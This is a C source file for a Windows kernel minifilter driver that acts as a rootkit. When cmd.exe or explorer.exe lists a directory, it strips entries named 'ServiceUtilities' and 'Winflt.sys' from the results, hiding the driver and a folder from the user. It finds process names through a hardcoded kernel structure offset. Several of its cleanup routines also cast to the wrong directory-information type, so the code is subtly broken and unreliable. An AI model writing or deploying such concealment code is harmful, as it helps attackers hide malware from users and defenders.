#include <fltKernel.h>
#include <dontuse.h>
#include <suppress.h>


PFLT_FILTER g_minifilterHandle = NULL;

FLT_PREOP_CALLBACK_STATUS FltDirCtrlPreOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext);
FLT_POSTOP_CALLBACK_STATUS FltDirCtrlPostOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags);

NTSTATUS CleanFileFullDirectoryInformation(PFILE_FULL_DIR_INFORMATION info);
NTSTATUS CleanFileBothDirectoryInformation(PFILE_BOTH_DIR_INFORMATION info);
NTSTATUS CleanFileDirectoryInformation(PFILE_DIRECTORY_INFORMATION info);
NTSTATUS CleanFileIdFullDirectoryInformation(PFILE_ID_FULL_DIR_INFORMATION info);
NTSTATUS CleanFileIdBothDirectoryInformation(PFILE_ID_BOTH_DIR_INFORMATION info);
NTSTATUS CleanFileNamesInformation(PFILE_NAMES_INFORMATION info);

NTSTATUS FLTAPI InstanceFilterUnloadCallback(FLT_FILTER_UNLOAD_FLAGS Flags);
NTSTATUS FLTAPI InstanceSetupCallback(
	_In_ PCFLT_RELATED_OBJECTS  FltObjects,
	_In_ FLT_INSTANCE_SETUP_FLAGS  Flags,
	_In_ DEVICE_TYPE  VolumeDeviceType,
	_In_ FLT_FILESYSTEM_TYPE  VolumeFilesystemType);
NTSTATUS FLTAPI InstanceQueryTeardownCallback(
	_In_ PCFLT_RELATED_OBJECTS FltObjects,
	_In_ FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags);

// Constant FLT_REGISTRATION structure for our filter.
// This initializes the callback routines our filter wants to register for.
CONST FLT_OPERATION_REGISTRATION g_callbacks[] =
{
	{
		IRP_MJ_DIRECTORY_CONTROL, // We register for major function code IRP_MJ_DIRECTORY_CONTROL which represent the I/O request for the content of a directory
		0,
		FltDirCtrlPreOperation, // pre operation callback
		FltDirCtrlPostOperation // post operation callback
	},

	{ IRP_MJ_OPERATION_END }
};

// The FLT_REGISTRATION structure provides information about a file system minifilter to the filter manager.
CONST FLT_REGISTRATION g_filterRegistration =
{
	sizeof(FLT_REGISTRATION),
	FLT_REGISTRATION_VERSION,
	0,
	NULL,
	g_callbacks, // Registering callback functions
	InstanceFilterUnloadCallback, // For unloading the driver
	InstanceSetupCallback,
	InstanceQueryTeardownCallback,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL
};

// Main function for the driver
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	// register minifilter
	NTSTATUS status = FltRegisterFilter(DriverObject, &g_filterRegistration, &g_minifilterHandle);

	if (!NT_SUCCESS(status))
	{
		return status;
	}

	//start minifilter driver
	status = FltStartFiltering(g_minifilterHandle);

	if (!NT_SUCCESS(status))
	{
		FltUnregisterFilter(g_minifilterHandle);
	}

	return status;
}

FLT_PREOP_CALLBACK_STATUS FltDirCtrlPreOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);


	if (Data->Iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY) // If we're not in minor function IRP_MN_QUERY_DIRECTORY, which represent getting files inside the directory, we return an stop execution without calling post operation callback
		return FLT_PREOP_SUCCESS_NO_CALLBACK;

	switch (Data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass)
	{
	case FileIdFullDirectoryInformation:
	case FileIdBothDirectoryInformation:
	case FileBothDirectoryInformation:
	case FileDirectoryInformation:
	case FileFullDirectoryInformation:
	case FileNamesInformation:
		break;
	default:
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	return FLT_PREOP_SUCCESS_WITH_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS FltDirCtrlPostOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags)
{
	PFLT_PARAMETERS params = &Data->Iopb->Parameters;
	PEPROCESS CurrProcess;
	CHAR* CurrFileName;
	CHAR* ProcessNameToHide = "cmd.exe";
	CHAR* ProcessNameToHide2 = "explorer.exe";
	PFLT_FILE_NAME_INFORMATION fltName;
	NTSTATUS status;

	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);
	UNREFERENCED_PARAMETER(Flags);

	if (!NT_SUCCESS(Data->IoStatus.Status)) // if the status is an error, we return and stop the execution here
		return FLT_POSTOP_FINISHED_PROCESSING;

	// Getting current process
	CurrProcess = PsGetCurrentProcess();
	CurrFileName = (CHAR*)((ULONG_PTR)CurrProcess + 0x450);

	// Verifying current process is cmd.exe or explorer.exe (that's the process we want to hide files from)
	CHAR* matched = strstr(CurrFileName, ProcessNameToHide);
	CHAR* matched2 = strstr(CurrFileName, ProcessNameToHide2);

	status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &fltName);
	if (!NT_SUCCESS(status))
	{
		//LogWarning("FltGetFileNameInformation() failed with code:%08x", status);
		return FLT_POSTOP_FINISHED_PROCESSING;
	}

	if (matched || matched2)
	{
		__try
		{
			status = STATUS_SUCCESS;

			// Here we have a function for every type of structures that might be returned by the I/0 request
			switch (params->DirectoryControl.QueryDirectory.FileInformationClass)
			{
			case FileFullDirectoryInformation:
				status = CleanFileFullDirectoryInformation((PFILE_FULL_DIR_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer);
				break;
			case FileBothDirectoryInformation:
				status = CleanFileBothDirectoryInformation((PFILE_BOTH_DIR_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer);
				break;
			case FileDirectoryInformation:
				status = CleanFileDirectoryInformation((PFILE_DIRECTORY_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer);
				break;
			case FileIdFullDirectoryInformation:
				status = CleanFileIdFullDirectoryInformation((PFILE_ID_FULL_DIR_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer);
				break;
			case FileIdBothDirectoryInformation:
				status = CleanFileIdBothDirectoryInformation((PFILE_ID_BOTH_DIR_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer);
				break;
			case FileNamesInformation:
				status = CleanFileNamesInformation((PFILE_NAMES_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer);
				break;
			}

			Data->IoStatus.Status = status;
		}
		__finally
		{
			FltReleaseFileNameInformation(fltName); // We release the memory allocated for the File name structure
		}
	}

	return FLT_POSTOP_FINISHED_PROCESSING;
}

// Below every functions cleans a specific structures
NTSTATUS CleanFileFullDirectoryInformation(PFILE_FULL_DIR_INFORMATION info)
{
	PFILE_FULL_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UINT32 offset, moveLength;
	BOOLEAN search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		// See if the current files corresponds to ServiceUtilites folder or MiniFilterDriver.sys file
		WCHAR* string1 = L"ServiceUtilities";
		WCHAR* string2 = L"Winflt.sys";
		WCHAR* matched = wcsstr(info->FileName, string1);
		WCHAR* matched2 = wcsstr(info->FileName, string2);

		if (matched || matched2) // if it's one of the 2 previous files
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					// if there's a structure before and after the structure we want to delete
					prevInfo->NextEntryOffset += info->NextEntryOffset; // We modify offset of the previous structure to make it "point" to next structure
					offset = info->NextEntryOffset;
				}
				else
				{
					// if the structure is the last one in the list
					prevInfo->NextEntryOffset = 0; // we put the offset of the previous structure to 0 to indicate that it's the last one
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_FULL_DIR_INFORMATION), 0); // Either way, we fill the structure we want to delete with zeros, to delete the information
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					// if the structure we want to hide is the first in the list
					nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0) // we browse through the list until the last structure
					{
						moveLength += nextInfo->NextEntryOffset; // We calculate the addresse after the last structure by adding the different offsets
						nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);// We move the structure at the end of the list and the loop goes back to beginning and enter the condition where the structure we want to hide is the last one in the list
				}
				else
				{
					// If the structure is the only one in the list
					status = STATUS_NO_MORE_ENTRIES; // we return directly STATUS_NO_MORE_ENTRIES to specify that there is no file structures to return
					retn = TRUE;
				}
			}

			if (retn)
				return status;

			info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset; //used to see if there is other structures. If 0, we hit the last structure of the list, we can end the search
		prevInfo = info;
		info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE; // end of the search
	} while (search);

	return STATUS_SUCCESS;
}

NTSTATUS CleanFileBothDirectoryInformation(PFILE_BOTH_DIR_INFORMATION info)
{
	PFILE_BOTH_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UINT32 offset, moveLength;
	BOOLEAN search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		// See if the current files corresponds to ServiceUtilites folder or MiniFilterDriver.sys file
		WCHAR* string1 = L"ServiceUtilities";
		WCHAR* string2 = L"Winflt.sys";
		WCHAR* matched = wcsstr(info->FileName, string1);
		WCHAR* matched2 = wcsstr(info->FileName, string2);

		if (matched || matched2) // if it's one of the 2 previous files
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					// if there's a structure before and after the structure we want to delete
					prevInfo->NextEntryOffset += info->NextEntryOffset; // We modify offset of the previous structure to make it "point" to next structure
					offset = info->NextEntryOffset;
				}
				else
				{
					// if the structure is the last one in the list
					prevInfo->NextEntryOffset = 0; // we put the offset of the previous structure to 0 to indicate that it's the last one
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_FULL_DIR_INFORMATION), 0); // Either way, we fill the structure we want to delete with zeros, to delete the information
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					// if the structure we want to hide is the first in the list
					nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0) // we browse through the list until the last structure
					{
						moveLength += nextInfo->NextEntryOffset; // We calculate the addresse after the last structure by adding the different offsets
						nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);// We move the structure at the end of the list and the loop goes back to beginning and enter the condition where the structure we want to hide is the last one in the list
				}
				else
				{
					// If the structure is the only one in the list
					status = STATUS_NO_MORE_ENTRIES; // we return directly STATUS_NO_MORE_ENTRIES to specify that there is no file structures to return
					retn = TRUE;
				}
			}

			if (retn)
				return status;

			info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset; //used to see if there is other structures. If 0, we hit the last structure of the list, we can end the search
		prevInfo = info;
		info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE; // end of the search
	} while (search);

	return STATUS_SUCCESS;
}

NTSTATUS CleanFileDirectoryInformation(PFILE_DIRECTORY_INFORMATION info)
{
	PFILE_DIRECTORY_INFORMATION nextInfo, prevInfo = NULL;
	//UNICODE_STRING fileName;
	UINT32 offset, moveLength;
	BOOLEAN search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		// See if the current files corresponds to ServiceUtilites folder or MiniFilterDriver.sys file
		WCHAR* string1 = L"ServiceUtilities";
		WCHAR* string2 = L"Winflt.sys";
		WCHAR* matched = wcsstr(info->FileName, string1);
		WCHAR* matched2 = wcsstr(info->FileName, string2);

		if (matched || matched2) // if it's one of the 2 previous files
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					// if there's a structure before and after the structure we want to delete
					prevInfo->NextEntryOffset += info->NextEntryOffset; // We modify offset of the previous structure to make it "point" to next structure
					offset = info->NextEntryOffset;
				}
				else
				{
					// if the structure is the last one in the list
					prevInfo->NextEntryOffset = 0; // we put the offset of the previous structure to 0 to indicate that it's the last one
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_FULL_DIR_INFORMATION), 0); // Either way, we fill the structure we want to delete with zeros, to delete the information
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					// if the structure we want to hide is the first in the list
					nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0) // we browse through the list until the last structure
					{
						moveLength += nextInfo->NextEntryOffset; // We calculate the addresse after the last structure by adding the different offsets
						nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);// We move the structure at the end of the list and the loop goes back to beginning and enter the condition where the structure we want to hide is the last one in the list
				}
				else
				{
					// If the structure is the only one in the list
					status = STATUS_NO_MORE_ENTRIES; // we return directly STATUS_NO_MORE_ENTRIES to specify that there is no file structures to return
					retn = TRUE;
				}
			}

			if (retn)
				return status;

			info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset; //used to see if there is other structures. If 0, we hit the last structure of the list, we can end the search
		prevInfo = info;
		info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE; // end of the search
	} while (search);

	return STATUS_SUCCESS;
}

NTSTATUS CleanFileIdFullDirectoryInformation(PFILE_ID_FULL_DIR_INFORMATION info)
{
	PFILE_ID_FULL_DIR_INFORMATION nextInfo, prevInfo = NULL;
	//UNICODE_STRING fileName;
	UINT32 offset, moveLength;
	BOOLEAN search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		// See if the current files corresponds to ServiceUtilites folder or MiniFilterDriver.sys file
		WCHAR* string1 = L"ServiceUtilities";
		WCHAR* string2 = L"Winflt.sys";
		WCHAR* matched = wcsstr(info->FileName, string1);
		WCHAR* matched2 = wcsstr(info->FileName, string2);

		if (matched || matched2) // if it's one of the 2 previous files
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					// if there's a structure before and after the structure we want to delete
					prevInfo->NextEntryOffset += info->NextEntryOffset; // We modify offset of the previous structure to make it "point" to next structure
					offset = info->NextEntryOffset;
				}
				else
				{
					// if the structure is the last one in the list
					prevInfo->NextEntryOffset = 0; // we put the offset of the previous structure to 0 to indicate that it's the last one
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_FULL_DIR_INFORMATION), 0); // Either way, we fill the structure we want to delete with zeros, to delete the information
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					// if the structure we want to hide is the first in the list
					nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0) // we browse through the list until the last structure
					{
						moveLength += nextInfo->NextEntryOffset; // We calculate the addresse after the last structure by adding the different offsets
						nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);// We move the structure at the end of the list and the loop goes back to beginning and enter the condition where the structure we want to hide is the last one in the list
				}
				else
				{
					// If the structure is the only one in the list
					status = STATUS_NO_MORE_ENTRIES; // we return directly STATUS_NO_MORE_ENTRIES to specify that there is no file structures to return
					retn = TRUE;
				}
			}

			if (retn)
				return status;

			info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset; //used to see if there is other structures. If 0, we hit the last structure of the list, we can end the search
		prevInfo = info;
		info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE; // end of the search
	} while (search);

	return STATUS_SUCCESS;
}

NTSTATUS CleanFileIdBothDirectoryInformation(PFILE_ID_BOTH_DIR_INFORMATION info)
{
	PFILE_ID_BOTH_DIR_INFORMATION nextInfo, prevInfo = NULL;
	//UNICODE_STRING fileName;
	UINT32 offset, moveLength;
	BOOLEAN search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		// See if the current files corresponds to ServiceUtilites folder or MiniFilterDriver.sys file
		WCHAR* string1 = L"ServiceUtilities";
		WCHAR* string2 = L"Winflt.sys";
		WCHAR* matched = wcsstr(info->FileName, string1);
		WCHAR* matched2 = wcsstr(info->FileName, string2);

		if (matched || matched2) // if it's one of the 2 previous files
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					// if there's a structure before and after the structure we want to delete
					prevInfo->NextEntryOffset += info->NextEntryOffset; // We modify offset of the previous structure to make it "point" to next structure
					offset = info->NextEntryOffset;
				}
				else
				{
					// if the structure is the last one in the list
					prevInfo->NextEntryOffset = 0; // we put the offset of the previous structure to 0 to indicate that it's the last one
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_FULL_DIR_INFORMATION), 0); // Either way, we fill the structure we want to delete with zeros, to delete the information
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					// if the structure we want to hide is the first in the list
					nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0) // we browse through the list until the last structure
					{
						moveLength += nextInfo->NextEntryOffset; // We calculate the addresse after the last structure by adding the different offsets
						nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);// We move the structure at the end of the list and the loop goes back to beginning and enter the condition where the structure we want to hide is the last one in the list
				}
				else
				{
					// If the structure is the only one in the list
					status = STATUS_NO_MORE_ENTRIES; // we return directly STATUS_NO_MORE_ENTRIES to specify that there is no file structures to return
					retn = TRUE;
				}
			}

			if (retn)
				return status;

			info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset; //used to see if there is other structures. If 0, we hit the last structure of the list, we can end the search
		prevInfo = info;
		info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE; // end of the search
	} while (search);

	return STATUS_SUCCESS;
}

NTSTATUS CleanFileNamesInformation(PFILE_NAMES_INFORMATION info)
{
	PFILE_NAMES_INFORMATION nextInfo, prevInfo = NULL;
	//UNICODE_STRING fileName;
	UINT32 offset, moveLength;
	BOOLEAN search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		// See if the current files corresponds to ServiceUtilites folder or MiniFilterDriver.sys file
		WCHAR* string1 = L"ServiceUtilities";
		WCHAR* string2 = L"Winflt.sys";
		WCHAR* matched = wcsstr(info->FileName, string1);
		WCHAR* matched2 = wcsstr(info->FileName, string2);

		if (matched || matched2) // if it's one of the 2 previous files
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					// if there's a structure before and after the structure we want to delete
					prevInfo->NextEntryOffset += info->NextEntryOffset; // We modify offset of the previous structure to make it "point" to next structure
					offset = info->NextEntryOffset;
				}
				else
				{
					// if the structure is the last one in the list
					prevInfo->NextEntryOffset = 0; // we put the offset of the previous structure to 0 to indicate that it's the last one
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_FULL_DIR_INFORMATION), 0); // Either way, we fill the structure we want to delete with zeros, to delete the information
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					// if the structure we want to hide is the first in the list
					nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0) // we browse through the list until the last structure
					{
						moveLength += nextInfo->NextEntryOffset; // We calculate the addresse after the last structure by adding the different offsets
						nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);// We move the structure at the end of the list and the loop goes back to beginning and enter the condition where the structure we want to hide is the last one in the list
				}
				else
				{
					// If the structure is the only one in the list
					status = STATUS_NO_MORE_ENTRIES; // we return directly STATUS_NO_MORE_ENTRIES to specify that there is no file structures to return
					retn = TRUE;
				}
			}

			if (retn)
				return status;

			info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset; //used to see if there is other structures. If 0, we hit the last structure of the list, we can end the search
		prevInfo = info;
		info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE; // end of the search
	} while (search);

	return STATUS_SUCCESS;
}

// Function to unload the MiniFilter
NTSTATUS FLTAPI InstanceFilterUnloadCallback(FLT_FILTER_UNLOAD_FLAGS Flags)
{
	//
	// This is called before a filter is unloaded.
	// If NULL is specified for this routine, then the filter can never be unloaded.
	UNREFERENCED_PARAMETER(Flags);
	if (NULL != g_minifilterHandle)
	{
		FltUnregisterFilter(g_minifilterHandle);
	}

	return STATUS_SUCCESS;
}

NTSTATUS FLTAPI InstanceSetupCallback(
	_In_ PCFLT_RELATED_OBJECTS  FltObjects,
	_In_ FLT_INSTANCE_SETUP_FLAGS  Flags,
	_In_ DEVICE_TYPE  VolumeDeviceType,
	_In_ FLT_FILESYSTEM_TYPE  VolumeFilesystemType)
{
	//
	// This is called to see if a filter would like to attach an instance to the given volume.
	//
	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(VolumeDeviceType);
	UNREFERENCED_PARAMETER(VolumeFilesystemType);
	return STATUS_SUCCESS;
}

NTSTATUS FLTAPI InstanceQueryTeardownCallback(
	_In_ PCFLT_RELATED_OBJECTS FltObjects,
	_In_ FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags)
{
	//
	// This is called to see if the filter wants to detach from the given volume.
	//
	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(FltObjects);
	return STATUS_SUCCESS;
}